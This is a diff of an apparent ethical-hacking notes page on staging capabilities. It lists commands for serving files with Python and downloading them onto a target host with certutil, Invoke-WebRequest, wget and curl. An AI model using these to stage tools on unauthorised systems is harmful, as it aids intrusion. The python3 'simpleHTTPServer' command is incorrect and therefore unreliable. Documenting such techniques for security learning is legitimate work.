@@ -1,7 +1,7 @@
 ---
 title: Obtain, Develop and Stage Capabilities
 categories: [Ethical Hacking Tools,Stage Capabilities]
-tags: [stage capabilities (T1608), obtain capabilities (T1588), develop capabilities (T1587)]
+tags: [stage capabilities (T1608), obtain capabilities (T1588), develop capabilities (T1587), powershell, bash, certutil.exe, python, wget, curl, invoke-webrequest]
 comments: true
 ---
 
@@ -45,6 +45,7 @@ Python is able to be used to host a HTTP web server in order to serve resources 
     ```bash
     python3 -m simpleHTTPServer %PORT%
     ```
+    {: .nolineno }
 
 ### Downloading Hosted Resources
 
@@ -56,20 +57,26 @@ There are various ways to download the resources on a target host via the aforem
     ```powershell
     certutil.exe -urlcache -f http://%IPADDRESS%:%PORT%/%RESOURCE% %OUTPUT%
     ```
-2. Invoke-WebRequest (wget)
+    {: .nolineno }
+
+2. Invoke-WebRequest (Wget)
 
     ```powershell
     Invoke-WebRequest -Method Get -Url http://%IPADDRESS%:%PORT%/%RESOURCE% -OutFile %OUTPUT%
     ```
+    {: .nolineno }
+
 **Linux**
 1. Wget
 
     ```bash
     wget -O %OUTPUT% http://%IPADDRESS%:%PORT%/%RESOURCE%
     ```
+    {: .nolineno }
 
 2. Curl
 
     ```bash
     curl -o %OUTPUT% http://%IPADDRESS%:%PORT%/%RESOURCE%
     ```
+    {: .nolineno }
